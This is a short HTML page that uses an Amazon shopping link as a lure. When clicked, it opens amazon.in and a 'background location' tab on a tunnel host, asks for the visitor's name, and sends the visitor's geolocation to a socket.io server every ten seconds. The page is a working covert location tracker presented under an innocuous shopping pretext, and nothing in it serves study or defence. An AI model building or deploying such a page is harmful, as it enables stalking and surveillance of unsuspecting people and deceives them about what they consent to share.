<!DOCTYPE html>
<html>
<head>
    <title>Amazon + Background Tracker</title>
</head>
<body>
    <h2>Click below to open Amazon & background tracker</h2>
    <button id="openBoth">Open Amazon + Start Tracker</button>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const name = prompt("Enter your name");

        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        socket.emit("location", {
                            name: name,
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        });
                        console.log("Location sent:", position.coords);
                    },
                    () => console.log("Location permission denied")
                );
            }
        }

        document.getElementById("openBoth").addEventListener("click", () => {
            // 1️⃣ Amazon tab
            window.open("https://www.amazon.in", "_blank");

            // 2️⃣ Background location tab
            window.open("https://myapp.serveousercontent.com", "_blank");

            // Start sending location in current tab (optional)
            sendLocation();
            setInterval(sendLocation, 10000);
        });
    </script>
</body>
</html>
